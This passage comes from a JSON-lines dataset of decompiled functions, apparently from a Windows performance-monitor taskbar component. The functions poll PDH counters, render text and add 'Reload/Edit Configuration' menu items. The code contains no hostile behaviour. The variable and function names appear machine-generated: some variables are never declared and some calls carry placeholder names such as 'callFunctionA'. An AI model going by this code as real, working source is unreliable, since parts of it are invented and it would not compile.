windowDimensions.right - windowDimensions.left, windowDimensions.bottom - windowDimensions.top, parentWindowHandle, menuHandle,\n                         DAT_1004fccc, (LPVOID)0x0);\n    }\n    int **integerPointerPointer = (int **)(windowParam + 0x4c); \n    \n    if (*integerPointerPointer != functionPointer) {\n        \n        if ((**(code **)*functionPointer)(functionPointer, &DAT_10048210, integerPointerPointer) < 0) {\n            *integerPointerPointer = (int *)0x0; \n        }\n        \n        if (*integerPointerPointer != (int *)0x0) {\n            (**(code **)(**integerPointerPointer + 8))(*integerPointerPointer); \n        }\n    }\nLAB_10010a29:\n    \n    if (dataPointer != (int *)0x0) {\n        (**(code **)(*dataPointer + 8))(dataPointer); \n    }\n    ExceptionList = originalExceptionList; \n    ___security_check_cookie_4(securityCheckValue ^ (uint)&stack0xfffffff0); \n    return; \n}"}
{"Function Name": "FUN_10010b50", "Address": "10010b50", "Source Code": "void FUN_10010b50(int input_param, int data_param)\n{\n    undefined4 ****pointer_to_pointer; \n    code *function_pointer; \n    int temp_var; \n    undefined4 ****local_pointer_array[4]; \n    uint security_cookie = DAT_1004e008 ^ (uint)local_pointer_array; \n    \n    if (*(short *)(data_param + 0xe) != 0) {\n        goto LAB_10010b72; \n    }\n    \n    \n    if (*(short *)(data_param + 0xc) == 1) {\n        \n        (**(code **)(*(int *)(input_param + -0x10) + 0x20))((int *)(input_param + -0x10));\n    } else {\n        \n        if (*(short *)(data_param + 0xc) != 2) {\n            goto LAB_10010b72; \n        }\n        \n        temp_var = input_param + -0x10; \n        function_pointer = *(code **)(*(int *)(input_param + -0x10) + 0x24); \n        \n        \n        if (function_pointer == FUN_10010320) {\n            uint comparison_value = 7; \n            local_pointer_array[0] = (undefined4 ****)((uint)local_pointer_array[0] & 0xffff0000); \n            temp_var = FUN_1000acf0(local_pointer_array); \n            \n            \n            if (temp_var < 0) {\n                \n                if (comparison_value < 8) {\n                    goto LAB_10010ca6; \n                }\n                \n                pointer_to_pointer = local_pointer_array[0]; \n                \n                \n                if ((comparison_value * 2 + 2 < 0x1000) ||\n                    (pointer_to_pointer = (undefined4 ****)local_pointer_array[0][-1],\n                    (uint)((int)local_pointer_array[0] + (-4 - (int)pointer_to_pointer)) < 0x20)) {\n                    FUN_10013ceb(pointer_to_pointer); \n                    ___security_check_cookie_4(security_cookie ^ (uint)local_pointer_array); \n                    return; \n                }\n            } else {\n                pointer_to_pointer = local_pointer_array[0]; \n                if (7 < comparison_value) {\n                    pointer_to_pointer = local_pointer_array[0]; \n                }\n                \n                \n                ShellExecuteW((HWND)0x0, L\"edit\", (LPCWSTR)pointer_to_pointer, (LPCWSTR)0x0, (LPCWSTR)0x0, 1);\n                \n                \n                if (comparison_value < 8) {\n                    goto LAB_10010c85; \n                }\n                \n                pointer_to_pointer = local_pointer_array[0]; \n                \n                \n                if ((comparison_value * 2 + 2 < 0x1000) ||\n                    (pointer_to_pointer = (undefined4 ****)local_pointer_array[0][-1],\n                    (uint)((int)local_pointer_array[0] + (-4 - (int)pointer_to_pointer)) < 0x20)) {\n                    FUN_10013ceb(pointer_to_pointer); \n                    goto LAB_10010c85; \n                }\n            }\n            function_pointer = (code *)FUN_1001dea6(); \n        }\n        (*function_pointer)(temp_var); \n    }\nLAB_10010ca6:\n    ___security_check_cookie_4(security_cookie ^ (uint)local_pointer_array); \n    return; \nLAB_10010b72:\n    ___security_check_cookie_4(security_cookie ^ (uint)local_pointer_array); \n    return; \n}"}
{"Function Name": "FUN_10010cd0", "Address": "10010cd0", "Source Code": "undefined4\nFUN_10010cd0(undefined4 inputParam, HMENU menuHandle, UINT menuID, UINT_PTR menuItemID, undefined4 extraParam, byte flags)\n{\n    \n    if (flags & 1) {\n        return 0; \n    }\n    \n    \n    InsertMenuW(menuHandle, menuID, 0xc00, menuItemID, NULL);\n    \n    \n    InsertMenuW(menuHandle, menuID, 0x400, menuItemID + 1, L\"Performance Monitor - (Reload Configuration)\");\n    \n    \n    InsertMenuW(menuHandle, menuID, 0x400, menuItemID + 2, L\"Performance Monitor - (Edit Configuration)\");\n    \n    \n    return 3;\n}"}
{"Function Name": "FUN_10010d30", "Address": "10010d30", "Source Code": "undefined4 FUN_10010d30(undefined4 input_value, undefined4 *output_array)\n{\n    \n    output_array[0] = value_one;\n    \n    \n    output_array[1] = value_two;\n    \n    \n    output_array[2] = value_three;\n    \n    \n    output_array[3] = value_four;\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_10010da0", "Address": "10010da0", "Source Code": "void __thiscall FUN_10010da0(void *this,HDC param_1,int param_2,int param_3)\n{\n    byte *bytePointer; \n    byte colorOrStyleByte; \n    wchar_t wideCharVar; \n    HDC deviceContextHandle; \n    uint unsignedIntVar8; \n    int integerVar9; \n    int *intPointerArray; \n    double localPointerVar31; \n    int *localPointerVar32; \n    uint localPointerVar10; \n    ushort **localPointerVar33; \n    HDC localDeviceContextHandle; \n    ushort **localPointerVar34; \n    ushort **localPointerVar35; \n    tagTEXTMETRICW localPointerVar36; \n    int stackIntegerVar; \n    tagRECT localPointerVar37; \n    wchar_t localPointerVar38; \n    wchar_t localPointerVar40[256]; \n    wchar_t localPointerVar39[258]; \n    uint localPointerVar30; \n    void *localPointerVar29; \n    uint localPointerVar28; \n    localPointerVar28 = 0xffffffff; \n    localPointerVar29 = ExceptionList; \n    localPointerVar30 = DAT_1004e008 ^ (uint)&stack0xfffffff0; \n    ExceptionList = &localPointerVar29; \n    integerVar9 = *(int *)((int)this + 0x78); \n    localDeviceContextHandle = param_1; \n    \n    if (integerVar9 != *(int *)((int)this + 0x7c)) {\n        uint unsignedIntVar15 = *(uint *)((int)this + 0x8c); \n        unsignedIntVar8 = *(int *)((int)this + 0x7c) - integerVar9 >> 4; \n        \n        if (unsignedIntVar8 <= unsignedIntVar15) {\n            unsignedIntVar15 = unsignedIntVar8 - 1; \n            *(uint *)((int)this + 0x8c) = unsignedIntVar15; \n        }\n        intPointerArray = (int *)(unsignedIntVar15 * 0x10 + integerVar9); \n        localPointerVar32 = intPointerArray; \n        \n        if (intPointerArray[1] != intPointerArray[2]) {\n            _local_1478 = ZEXT816(0); \n            localVariable1468 = ZEXT816(0); \n            integerVar9 = PdhCollectQueryData(); \n            \n            if (integerVar9 == 0) {\n                _local_1448 = ZEXT816(0); \n                _local_1438 = ZEXT816(0); \n                FUN_10013410((undefined4 *)local_1448); \n                localPointerVar28 = 0; \n                ushort **ushortPointerVar = *(ushort ***)((int)this + 0x44); \n                \n                if (ushortPointerVar != *(ushort ***)((int)localPointerVar3 + 0x48)) {\n                    do {\n                        integerVar9 = PdhGetFormattedCounterValue(ushortPointerVar[6],0x200,0,&localPointerVar37); \n                        \n                        if (integerVar9 == 0) {\n                            FUN_100136d0(local_1448,(float **)&localPointerVar31,ushortPointerVar); \n                            *(ulonglong *)(localPointerVar31._0_4_ + 0x20) = CONCAT44(localPointerVar37.bottom,localPointerVar37.right); \n                        }\n                        ushortPointerVar = ushortPointerVar + 7; \n                    } while (ushortPointerVar != *(ushort ***)((int)localPointerVar3 + 0x48)); \n                }\n                localVariable5 = _local_1478; \n                local_1478 = local_1448; \n                localVariable6 = _local_1478; \n                stackIntegerVar = localVariable5._12_4_; \n                _local_1478 = localVariable6._0_8_; \n                stackVariable1474._4_4_ = 0; \n                undefined4 functionResult = FUN_100138e0(0,0); \n                localVariable1468 = _local_1438; \n                localVariable6 = _local_1448; \n                functionReturnValue = piStack_1444; \n                piStack_1444 = (int *)functionResult; \n                uStack_1440 = localVariable6._8_4_; \n                stackVariable1474._0_4_ = functionReturnValue; \n                stackVariable1474._4_4_ = localVariable5._8_4_; \n                functionReturnValue = stackVariable1474._4_4_; \n                stackVariable1474._4_4_ = uStack_1440; \n                iStack_143c = localVariable6._12_4_; \n                stackIntegerVar = iStack_143c; \n                uStack_1440 = functionReturnValue; \n                iStack_143c = 0; \n                localVariable5._8_8_ = 0; \n                localVariable5._0_8_ = uStack_1430; \n                _local_1438 = localVariable5 << 0x40; \n                localPointerVar28 = CONCAT31(localPointerVar28._1_3_,1); \n                FUN_10011f00((int **)(local_1448 + 4)); \n                \n                if ((uint)(localVariable1438._4_4_ - iStack_143c >> 2) < 0x10) {\n                    FUN_1000ba50(&iStack_143c,0x10); \n                }\n                localPointerVar4 = piStack_1444; \n                FUN_1000b7e0(&iStack_143c,0x10,&localPointerVar4); \n                uStack_1430._0_4_ = 7; \n                uStack_1430._4_4_ = 8; \n                FUN_100114c0((int)local_1448); \n            } else {\n                FUN_10013410((undefined4 *)local_1478); \n            }\n            GetTextMetricsW(localDeviceContextHandle,&localPointerVar36); \n            _memset(&localPointerVar38,0,0x800); \n            _memset(localFinalStringVar,0,0x800); \n            localPointerVar10 = 0; \n            integerVar9 = intPointerArray[2] - intPointerArray[1] >> 0x1f; \n            \n            if ((intPointerArray[2] - intPointerArray[1]) / 0x38 + integerVar9 != integerVar9) {\n                localPointerVar4 = (int *)0x0; \n                do {\n                    localPointerVar38 = L'\\0'; \n                    ushort **ushortPointerVar = *(ushort ***)(intPointerArray[1] + 0x28 + (int)localPointerVar4); \n                    localPointerVar33 = (ushort **)(intPointerArray[1] + (int)localPointerVar4); \n                    localPointerVar34 = ushortPointerVar; \n                    \n                    if (ushortPointerVar != (ushort **)localPointerVar33[0xb]) {\n                        LAB_100110a0: \n                        ushort **ppuVar12 = ushortPointerVar; \n                        \n                        if ((ushort *)0x7 < ushortPointerVar[5]) {\n                            ppuVar12 = (ushort **)*ushortPointerVar; \n                        }\n                        hashValue = 0x811c9dc5; \n                        uint unsignedIntVar15 = 0; \n                        \n                        if ((int)ushortPointerVar[4] * 2 != 0) {\n                            hashValue = 0x811c9dc5; \n                            do {\n                                bytePointer = (byte *)(unsignedIntVar15 + (int)ppuVar12); \n                                unsignedIntVar15 = unsignedIntVar15 + 1; \n                                hashValue = (*bytePointer ^ hashValue) * 0x1000193; \n                            } while (unsignedIntVar15 < (uint)((int)ushortPointerVar[4] * 2)); \n                        }\n                        hashValue = hashValue & localVariable1468._8_4_; \n                        undefined4 *undefinedPointerVar = *(undefined4 **)(stackIntegerVar + hashValue * 8); \n                        localPointerVar31 = (double)CONCAT44(undefinedPointerVar,localPointerVar31._0_4_); \n                        undefined4 *undefinedPointerVar2 = undefinedPointerVar; \n                        do {\n                            undefined4 *undefinedPointerVar3 = (undefined4 *)stackVariable1474._0_4_; \n                            \n                            if (undefinedPointerVar != (undefined4 *)stackVariable1474._0_4_) {\n                                undefinedPointerVar3 = (undefined4 *)**(undefined4 **)(stackIntegerVar + 4 + hashValue * 8); \n                            }\n                            undefined4 *undefinedPointerVar4 = (undefined4 *)stackVariable1474._0_4_; \n                            localPointerVar34 = ushortPointerVar; \n                            \n                            if (undefinedPointerVar2 == undefinedPointerVar3) goto LAB_100111c9; \n                            localPointerVar35 = (ushort **)(undefinedPointerVar2 + 2); \n                            ppuVar12 = ushortPointerVar; \n                            \n                            if ((ushort *)0x7 < ushortPointerVar[5]) {\n                                ppuVar12 = (ushort **)*ushortPointerVar; \n                            }\n                            ushort *puVar16 = (ushort *)undefinedPointerVar2[6]; \n                            \n                            if (7 < (uint)undefinedPointerVar2[7]) {\n                                localPointerVar35 = (ushort **)*localPointerVar35; \n                            }\n                            \n                            if (puVar16 == ushortPointerVar[4]) {\n                                \n                                if (puVar16 == (ushort *)0x0) goto LAB_100111b2; \n                                ushort uVar18 = *(ushort *)localPointerVar35; \n                                \n                                if (*(ushort *)ppuVar12 <= uVar18) {\n                                    localPointerVar35 = (ushort **)((int)localPointerVar35 - (int)ppuVar12); \n                                    do {\n                                        \n                                        if (*(ushort *)ppuVar12 < uVar18) break; \n                                        \n                                        if (puVar16 == (ushort *)0x1) goto LAB_100111b2; \n                                        ppuVar12 = (ushort **)((int)ppuVar12 + 2); \n                                        puVar16 = (ushort *)((int)puVar16 + -1); \n                                        uVar18 = *(ushort *)((int)localPointerVar35 + (int)ppuVar12); \n                                    } while (*(ushort *)ppuVar12 <= uVar18); \n                                }\n                            }\n                            undefinedPointerVar2 = (undefined4 *)*undefinedPointerVar2; \n                        } while (true); \n                    }\n                    LAB_1001130b: \n                    ushortPointerVar = localPointerVar33; \n                    GetClientRect(*(HWND *)((int)localPointerVar3 + 0x18),&localPointerVar37); \n                    \n                    localPointerVar37.top = localPointerVar37.top + (localPointerVar36.tmHeight - localPointerVar36.tmExternalLeading) * localPointerVar10 + *localPointerVar32 + param_3;\n                    localPointerVar37.bottom = localPointerVar37.bottom + param_3; \n                    localPointerVar37.left = localPointerVar37.left + param_2; \n                    localPointerVar37.right = localPointerVar37.right + param_2; \n                    localPointerVar35 = ushortPointerVar; \n                    \n                    if ((ushort *)0x7 < ushortPointerVar[5]) {\n                        localPointerVar35 = (ushort **)*ushortPointerVar; \n                    }\n                    colorOrStyleByte = *(byte *)((int)ushortPointerVar + 0x19); \n                    integerVar9 = 0; \n                    \n                    if (*(char *)(localPointerVar33 + 6) != '\\0') {\n                        integerVar9 = 700; \n                    }\n                    int deviceCapabilityVar = GetDeviceCaps(localDeviceContextHandle,0x5a); \n                    deviceCapabilityVar = MulDiv((int)*(double *)(localPointerVar33 + 8),deviceCapabilityVar,0x48); \n                    HFONT fontHandle = CreateFontW(-deviceCapabilityVar,0,0,0,integerVar9,(uint)colorOrStyleByte,0,0,0,0,0,0,0,(LPCWSTR)localPointerVar35); \n                    deviceContextHandle = localDeviceContextHandle; \n                    SetTextColor(localDeviceContextHandle,(COLORREF)localPointerVar33[7]); \n                    HGDIOBJ previousObjectHandle = SelectObject(deviceContextHandle,fontHandle); \n                    wchar_t *wideCharPointer = &localPointerVar38; \n                    do {\n                        wideCharVar = *wideCharPointer; \n                        wideCharPointer = wideCharPointer + 1; \n                    } while (wideCharVar != L'\\0'); \n                    DrawTextW(localDeviceContextHandle,&localPointerVar38,(int)wideCharPointer - (int)local_c26 >> 1,&localPointerVar37,0); \n                    SelectObject(localDeviceContextHandle,previousObjectHandle); \n                    localPointerVar4 = localPointerVar4 + 0xe; \n                    localPointerVar10 = localPointerVar10 + 1; \n                    intPointerArray = localPointerVar32; \n                } while (localPointerVar10 < (uint)((localPointerVar32[2] - localPointerVar32[1]) / 0x38)); \n            }\n            FUN_100114c0((int)local_1478); \n        }\n    }\n    ExceptionList = localPointerVar29; \n    ___security_check_cookie_4(localPointerVar30 ^ (uint)&stack0xfffffff0); \n    return; \nLAB_100111b2: \n    functionReturnValue = FUN_1000cc60(ushortPointerVar,(ushort **)(undefinedPointerVar2 + 2)); \n    undefined4 *undefinedPointerVar4 = undefinedPointerVar2; \n    \n    if ((char)functionReturnValue != '\\0') {\n        undefinedPointerVar4 = (undefined4 *)stackVariable1474._0_4_; \n    }\nLAB_100111c9: \n    _memset(localPointerVar39,0,0x200); \n    \n    if (undefinedPointerVar4 == (undefined4 *)stackVariable1474._0_4_) {\n        _wcscpy_s(localPointerVar39,0x100,L\"[N/A]\"); \n    } else {\n        localPointerVar31 = *(double *)(undefinedPointerVar4 + 8); \n        \n        if (0.0 < *(double *)(ushortPointerVar + 0x14)) {\n            localPointerVar31 = localPointerVar31 / *(double *)(ushortPointerVar + 0x14); \n        }\n        _memset(localPointerVar40,0,0x200); \n        FUN_1000d170(localPointerVar40,0x100,L\"%s%d.%d%s\"); \n        FUN_1000d170(localPointerVar39,0x100,localPointerVar40); \n    }\n    FUN_1000d170(localFinalStringVar,0x400,L\"%s%s%s\"); \n    _wcscat_s(&localPointerVar38,0x400,localFinalStringVar); \n    ushortPointerVar = ushortPointerVar + 0x16; \n    localPointerVar34 = ushortPointerVar; \n    \n    if (ushortPointerVar == (ushort **)localPointerVar33[0xb]) goto LAB_1001130b; \n    goto LAB_100110a0; \n}"}
{"Function Name": "thunk_FUN_100114c0", "Address": "100114b0", "Source Code": "void __fastcall thunk_FUN_100114c0(int inputParam)\n{\n    \n    void *pointerFromStruct = *(void **)(inputParam + 0xc);\n    \n    \n    if (pointerFromStruct != (void *)0x0) {\n        void *initializedPointer = pointerFromStruct; \n        \n        \n        \n        if ((0xfff < (*(int *)(inputParam + 0x14) - (int)pointerFromStruct & 0xfffffffcU)) &&\n            (initializedPointer = *(void **)((int)pointerFromStruct + -4), 0x1f < (uint)((int)pointerFromStruct + (-4 - (int)initializedPointer)))) {\n            \n            FUN_1001dea6();\n            \n            ((code *)swi(3))();\n            return; \n        }\n        \n        \n        FUN_10013ceb(initializedPointer);\n        \n        \n        *(undefined4 *)(inputParam + 0xc) = 0;\n        *(undefined4 *)(inputParam + 0x10) = 0;\n        *(undefined4 *)(inputParam + 0x14) = 0;\n    }\n    \n    \n    FUN_10011f00((int **)(inputParam + 4));\n    \n    \n    FUN_10013ceb(*(void **)(inputParam + 4));\n}"}
{"Function Name": "FUN_10011530", "Address": "10011530", "Source Code": "void __fastcall FUN_10011530(void *param_1)\n{\n    HDC deviceContextHandle; \n    HWND parentWindowHandle; \n    HDC compatibleDeviceContextHandle; \n    HGDIOBJ gdiObjectHandle; \n    HBITMAP bitmapHandle; \n    tagRECT clientAreaRect; \n    tagPAINTSTRUCT paintStruct; \n    tagPOINT screenCoordinates; \n    undefined pointCoordinatesStack[12]; \n    int heightValue; \n    uint securityCookie = DAT_1004e008 ^ (uint)&param_1; \n    _memset(&paintStruct, 0, 0x40); \n    clientAreaRect = (tagRECT)ZEXT816(0); \n    BeginPaint(*(HWND *)((int)param_1 + 0x18), &paintStruct); \n    parentWindowHandle = GetParent(*(HWND *)((int)param_1 + 0x18)); \n    GetClientRect(parentWindowHandle, &clientAreaRect); \n    deviceContextHandle = CreateCompatibleDC(paintStruct.hdc); \n    bitmapHandle = CreateCompatibleBitmap(paintStruct.hdc, clientAreaRect.right - clientAreaRect.left, clientAreaRect.bottom - clientAreaRect.top); \n    gdiObjectHandle = SelectObject(deviceContextHandle, *(HGDIOBJ *)((int)param_1 + 0x54)); \n    SendMessageW(parentWindowHandle, 0x14, (WPARAM)deviceContextHandle, 0); \n    SendMessageW(parentWindowHandle, 0xf, (WPARAM)deviceContextHandle, 0); \n    SetBkMode(deviceContextHandle, 1); \n    SetTextColor(deviceContextHandle, 0xffffff); \n    ClientToScreen(*(HWND *)((int)param_1 + 0x18), (LPPOINT)pointCoordinatesStack); \n    screenCoordinates.x = 0; \n    screenCoordinates.y = 0; \n    ClientToScreen(parentWindowHandle, &screenCoordinates); \n    screenCoordinates.y = pointCoordinatesStack._4_4_ - screenCoordinates.y; \n    screenCoordinates.x = pointCoordinatesStack._0_4_ - screenCoordinates.x; \n    FUN_10010da0(param_1, deviceContextHandle, screenCoordinates.x, screenCoordinates.y); \n    BitBlt(paintStruct.hdc, 0, 0, pointCoordinatesStack._8_4_ - pointCoordinatesStack._0_4_, heightValue - pointCoordinatesStack._4_4_, deviceContextHandle, screenCoordinates.x, screenCoordinates.y, 0xcc0020); \n    SelectObject(deviceContextHandle, gdiObjectHandle); \n    DeleteObject(bitmapHandle); \n    DeleteDC(deviceContextHandle); \n    EndPaint(*(HWND *)((int)param_1 + 0x18), &paintStruct); \n    ___security_check_cookie_4(securityCookie ^ (uint)&param_1); \n    return; \n}"}
{"Function Name": "FUN_10011720", "Address": "10011720", "Source Code": "void __fastcall FUN_10011720(int **inputPointer) \n{\n    processInput(inputPointer); \n    handleValue(**inputPointer); \n}"}
{"Function Name": "FUN_10011790", "Address": "10011790", "Source Code": "undefined4\nFUN_10011790(undefined4 input1, undefined4 input2, int **intPointerArray, int flag, LCID localeId, undefined4 *outputValue)\n{\n    short shortValue; \n    int *intPointer; \n    uint unsignedInt1; \n    uint unsignedInt2; \n    undefined4 returnValue = 0; \n    int index; \n    int *previousIntPointer; \n    int *currentIntPointer; \n    int shortCount; \n    int *currentShortPointer; \n    \n    if ((DAT_1004ea5c == (int *)0x0) || (DAT_1004ea64 == 0)) {\n        returnValue = FUN_1000faa0(localeId); \n    }\n    \n    \n    if (DAT_1004ea5c != (int *)0x0 && (DAT_1004ea64 != 0) && (flag == 1)) {\n        intPointer = *intPointerArray; \n        if (intPointer != (int *)0x0) { \n            currentShortPointer = intPointer; \n            do {\n                shortValue = *(short *)currentShortPointer; \n                currentShortPointer = (int *)((int)currentShortPointer + 2); \n            } while (shortValue != 0); \n            shortCount = (int)currentShortPointer - ((int)intPointer + 2) >> 1; \n        } else {\n            shortCount = 0; \n        }\n        \n        index = DAT_1004ea68 - 1; \n        if (index >= 0) { \n            currentShortPointer = (int *)(DAT_1004ea64 + (index * 3 + 1) * 4); \n            do {\n                if (shortCount == *currentShortPointer) { \n                    previousIntPointer = (int *)currentShortPointer[-1]; \n                    currentIntPointer = intPointer; \n                    unsignedInt2 = *currentShortPointer * 2; \n                    while (unsignedInt1 = unsignedInt2 - 4, 3 < unsignedInt2) { \n                        if (*previousIntPointer != *currentIntPointer) goto LAB_10011856; \n                        previousIntPointer++; \n                        currentIntPointer++; \n                        unsignedInt2 = unsignedInt1; \n                    }\n                    if (unsignedInt1 == 0xfffffffc) { \nLAB_100118b7:\n                        *outputValue = *(undefined4 *)(DAT_1004ea64 + 8 + index * 0xc); \n                        return 0; \n                    }\nLAB_10011856:\n                    \n                    if ((*(char *)previousIntPointer == *(char *)currentIntPointer) &&\n                        ((unsignedInt1 == 0xfffffffd ||\n                        ((*(char *)((int)previousIntPointer + 1) == *(char *)((int)currentIntPointer + 1) &&\n                        ((unsignedInt1 == 0xfffffffe ||\n                        ((*(char *)((int)previousIntPointer + 2) == *(char *)((int)currentIntPointer + 2) &&\n                        ((unsignedInt1 == 0xffffffff ||\n                        (*(char *)((int)previousIntPointer + 3) == *(char *)((int)currentIntPointer + 3)))))))))))))\n                        goto LAB_100118b7; \n                }\n                index--; \n                currentShortPointer -= 3; \n            } while (index >= 0); \n        }\n    }\n    \n    \n    returnValue = (**(code **)(*DAT_1004ea5c + 0x28))(DAT_1004ea5c, intPointerArray, flag, outputValue);\n    return returnValue; \n}"}
{"Function Name": "FUN_100119a0", "Address": "100119a0", "Source Code": "void __fastcall FUN_100119a0(int **inputPointer)\n{\n    \n    callFunctionA(inputPointer);\n    \n    \n    callFunctionB(**inputPointer);\n}"}
{"Function Name": "FUN_10011a90", "Address": "10011a90", "Source Code": "undefined * getUndefinedPointer(void)\n{\n    \n    return retrieveData;\n}"}
{"Function Name": "FUN_10011aa0", "Address": "10011aa0", "Source Code": "void __fastcall checkAndProcess(int *inputPointer) \n{\n    \n    if ((int *)*inputPointer != inputPointer + 1) {\n        \n        processValue((void *)*inputPointer);\n    }\n}"}
{"Function Name": "FUN_10011ab0", "Address": "10011ab0", "Source Code": "void __fastcall my_function(void **input_pointer)\n{\n    \n    thunk_function(*input_pointer);\n    \n    \n    *input_pointer = NULL;\n}"}
{"Function Name": "FUN_10011ad0", "Address": "10011ad0", "Source Code": "int __fastcall FUN_10011ad0(int input_param, undefined4 input_param_2, undefined4 *output_param)\n{\n    int *int_pointer; \n    int function_result;   \n    int final_result;   \n    void *original_exception_list; \n    \n    if (output_param == (undefined4 *)0x0) {\n        return -0x7fffbffd; \n    }\n    \n    original_exception_list = ExceptionList; \n    ExceptionList = &original_exception_list; \n    *output_param = 0; \n    \n    int_pointer = (int *)FUN_100143c4(0x9c); \n    if (int_pointer != (int *)0x0) { \n        int_pointer[1] = 0; \n        *int_pointer = (int)ATL::CComAggObject<class_CPerfBar>::vftable; \n        FUN_1000ff30((int)(int_pointer + 2)); \n        int_pointer[0x10] = input_param; \n        int_pointer[2] = (int)ATL::CComContainedObject<class_CPerfBar>::vftable; \n        int_pointer[3] = (int)ATL::CComContainedObject<class_CPerfBar>::vftable; \n        int_pointer[4] = (int)ATL::CComContainedObject<class_CPerfBar>::vftable; \n        int_pointer[5] = (int)ATL::CComContainedObject<class_CPerfBar>::vftable; \n        int_pointer[6] = (int)ATL::CComContainedObject<class_CPerfBar>::vftable; \n        int_pointer[7] = (int)ATL::CComContainedObject<class_CPerfBar>::vftable; \n        LOCK(); \n        *(int *)(DAT_100504dc + 8) = *(int *)(DAT_100504dc + 8) + 1; \n        UNLOCK(); \n        function_result = (**(code **)(int_pointer[2] + 0x1c))(); \n        final_result = (function_result < 0) ? function_result : 0; \n        \n        if ((final_result == 0) && (final_result = (**(code **)*int_pointer)(int_pointer, input_param_2, output_param), final_result == 0)) {\n            ExceptionList = original_exception_list; \n            return 0; \n        }\n        (**(code **)(*int_pointer + 0xc))(1); \n    }\n    \n    ExceptionList = original_exception_list; \n    return final_result; \n}"}
{"Function Name": "Catch_All@10011ba8", "Address": "10011ba8", "Source Code": "undefined * catchAll(void)\n{\n    \n    return &data;\n}"}
{"Function Name": "Catch_All@10011ccd", "Address": "10011ccd", "Source Code": "undefined * catchAllFunction(void)\n{\n    \n    return &dataVariable;\n}"}
{"Function Name": "FUN_10011d50", "Address": "10011d50", "Source Code": "void FUN_10011d50(int input_value, int *int_pointer, int **int_pointer_pointer)\n{\n    \n    \n    \n    \n    \n    FUN_1000f650(input_value, 0x100483d0, int_pointer, int_pointer_pointer);\n}"}
{"Function Name": "FUN_10011d70", "Address": "10011d70", "Source Code": "int FUN_10011d70(int *input_array)\n{\n    int decremented_value; \n    LOCK(); \n    decremented_value = *(input_array + 1) - 1; \n    *(input_array + 1) = decremented_value; \n    UNLOCK(); \n    \n    if (decremented_value == 0) { \n        if (input_array != (int *)0x0) { \n            (**(code **)(*input_array + 0x14))(1); \n            return 0; \n        }\n    } else if (decremented_value == 1) { \n        LOCK(); \n        *(int *)(DAT_100504dc + 8) -= 1; \n        UNLOCK(); \n    }\n    return decremented_value; \n}"}
{"Function Name": "FUN_10011db0", "Address": "10011db0", "Source Code": "void FUN_10011db0(int input_value)\n{\n    \n    int *offset_pointer = (int *)(input_value + 4);\n    \n    \n    LOCK();\n    \n    \n    if (*offset_pointer == 1) {\n        \n        *(int *)(data_location + 8) = *(int *)(data_location + 8) + 1;\n    }\n    \n    \n    *offset_pointer = *offset_pointer + 1;\n    \n    \n    UNLOCK();\n}"}
{"Function Name": "FUN_10011de0", "Address": "10011de0", "Source Code": "void __fastcall FUN_10011de0(void **inputPointer)\n{\n    \n    FUN_1001dc78(**inputPointer);\n}"}
{"Function Name": "FUN_10011f00", "Address": "10011f00", "Source Code": "void __fastcall FUN_10011f00(int **pointerArray)\n{\n    \n    int **firstPointer = (int **)*pointerArray;\n    \n    int *currentPointer = *firstPointer;\n    \n    *firstPointer = (int *)firstPointer;\n    \n    (*pointerArray)[1] = (int)*pointerArray;\n    \n    pointerArray[1] = (int *)0x0;\n    \n    if (currentPointer != *pointerArray) {\n        do {\n            \n            int *nextPointer = (int *)*currentPointer;\n            \n            if (7 < (uint)currentPointer[7]) {\n                \n                void *secondElementPointer = (void *)currentPointer[2];\n                \n                if ((0xfff < currentPointer[7] * 2 + 2U) &&\n                    (0x1f < (uint)((int)secondElementPointer + (-4 - *(void **)((int)secondElementPointer - 4))))) \n                {\n                    \n                    FUN_1001dea6();\n                    \n                    ((code *)swi(3))();\n                    return; \n                }\n                \n                FUN_10013ceb(secondElementPointer);\n            }\n            \n            currentPointer[6] = 0;\n            \n            currentPointer[7] = 7;\n            \n            *(undefined2 *)(currentPointer + 2) = 0;\n            \n            FUN_10013ceb(currentPointer);\n            \n            currentPointer = nextPointer;\n        } while (nextPointer != *pointerArray); \n    }\n    return; \n}"}
{"Function Name": "FUN_10012010", "Address": "10012010", "Source Code": "int FUN_10012010(int *arrayPointer)\n{\n    int decrementedValue; \n    \n    arrayPointer[1] = arrayPointer[1] - 1; \n    decrementedValue = arrayPointer[1]; \n    \n    if (arrayPointer[1] == 0) { \n        LOCK(); \n        *(int *)(sharedCounterAddress + 8) += 1; \n        UNLOCK(); \n        \n        if (arrayPointer != (int *)0x0) { \n            (**(code **)(*arrayPointer + 0xc))(1); \n        }\n        \n        LOCK(); \n        *(int *)(sharedCounterAddress + 8) -= 1; \n        UNLOCK(); \n    }\n    \n    return decrementedValue; \n}"}
{"Function Name": "FUN_10012070", "Address": "10012070", "Source Code": "void FUN_10012070(int input_value, int *array_pointer, int **double_pointer)\n{\n    \n    \n    \n    \n    \n    FUN_1000f650(input_value, 0x100482b0, array_pointer, double_pointer);\n}"}
{"Function Name": "FUN_10012090", "Address": "10012090", "Source Code": "undefined4 FUN_10012090(int input_param)\n{\n    \n    int *int_pointer = (int *)(input_param + 0x38);\n    \n    \n    *int_pointer = *int_pointer - 1;\n    \n    \n    undefined4 retrieved_value = *(undefined4 *)(input_param + 0x38);\n    \n    \n    if (*int_pointer == 0) {\n        \n        LOCK();\n        \n        \n        *(int *)(counter_memory_address + 8) += 1;\n        \n        \n        UNLOCK();\n        \n        \n        if (input_param != 0) {\n            (**(code **)(*(int *)(input_param + 0x14) + 4))(1);\n        }\n        \n        \n        LOCK();\n        \n        \n        *(int *)(counter_memory_address + 8) -= 1;\n        \n        \n        UNLOCK();\n    }\n    \n    \n    return retrieved_value;\n}"}
{"Function Name": "FUN_10012370", "Address": "10012370", "Source Code": "void __fastcall FUN_10012370(LPCRITICAL_SECTION *critical_section_ptr)\n{\n    \n    if (*(char *)(critical_section_ptr + 1) != '\\0') {\n        \n        LeaveCriticalSection(*critical_section_ptr);\n        \n        *(char *)(critical_section_ptr + 1) = 0;\n    }\n}"}
